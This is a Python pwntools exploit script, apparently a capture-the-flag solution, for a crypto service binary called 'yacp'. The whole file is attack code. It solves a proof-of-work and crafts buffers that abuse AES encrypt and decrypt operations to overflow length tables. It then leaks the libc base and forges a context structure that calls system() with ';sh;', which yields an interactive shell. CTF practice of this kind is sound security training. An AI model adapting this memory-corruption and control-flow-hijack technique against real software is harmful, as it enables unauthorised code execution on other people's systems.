#!/usr/bin/env python
import sys, os
from pwn import *
import better_exceptions

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('yacp'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def POW():
    import subprocess as sp
    r.recvlines(3)
    prefix = r.recvline().split()[3]
    r.recvuntil('word? ')
    log.info('pow prefix: {}'.format(prefix))
    p = sp.Popen('./pow {}'.format(prefix), shell=True, stdout=sp.PIPE)
    r.sendline(p.stdout.read())

def load(data, idx):
    r.sendlineafter('5. Display data\n', '0')
    r.sendlineafter('data?\n', str(len(data)))
    r.sendlineafter('use?\n', str(idx))
    r.sendlineafter('bytes\n', data.encode('hex'))

def encrypt(crypto_type, in_idx, out_idx, key_idx=0, iv_idx=0):
    r.sendlineafter('5. Display data\n', '3')
    r.sendlineafter('perform?\n', crypto_type)
    r.sendlineafter('use?\n', str(in_idx))
    r.sendlineafter('use?\n', str(out_idx))
    r.sendlineafter('use?\n', str(key_idx))
    r.sendlineafter('use?\n', str(iv_idx))

def decrypt(crypto_type, in_idx, out_idx, key_idx=0, iv_idx=0):
    r.sendlineafter('5. Display data\n', '4')
    r.sendlineafter('perform?\n', crypto_type)
    r.sendlineafter('use?\n', str(in_idx))
    r.sendlineafter('use?\n', str(out_idx))
    r.sendlineafter('use?\n', str(key_idx))
    r.sendlineafter('use?\n', str(iv_idx))

def display(idx):
    r.sendlineafter('5. Display data\n', '5')
    r.sendlineafter('use?\n', str(idx))
    info, data = r.recvline().split('=')
    return info.strip(), data.strip()

r = remote(HOST, PORT)
if len(sys.argv) > 2: POW()

# encrypt exploit by blocks (16 bytes)
buf_addr = 0x805a0e0
exp = flat(
    0, 0x880, 0, 0,
    0, 0x900, 0x112c, 0, 
    0, 0, 0, 0,
    0, 1, buf_addr, ';sh;',
)
exp = exp.ljust(0x800, '\x00') 
load(exp, 1)

# overflow, g_buflens[1] = 0x810 
encrypt('aes-128-ecb', 1, 1) 

# full control g_buflens
# g_buflens[1] = 0x880, g_buflens[30] = 0x112c
info, buf = display(1)
load(unhex(buf[:32]), 2)
decrypt('aes-128-ecb', 1, 31)
load(unhex(buf[:32]) + unhex(buf[64:96])*6 + unhex(buf[32:64]), 2)
decrypt('aes-128-ecb', 1, 31)

# leak libc with g_bufs[30]
info, leak = display(30)
libc_base = u32(unhex(leak[-8:])) - 0x390ce0
libc.address += libc_base
log.info('libc_base: {}'.format(hex(libc_base)))

# forge ctx
fake_ctx = flat(
    0, 0, 0, 0, 
    0x100000, 0, libc.sym['system'] 
)
load(fake_ctx, 28)

# decrypt g_bufs[29] to g_bufs[31] and overwrite g_ctx
load(unhex(buf[64:96])*0x9 + unhex(buf[96:128]), 30)
decrypt('aes-128-ecb', 29, 31)

r.interactive()
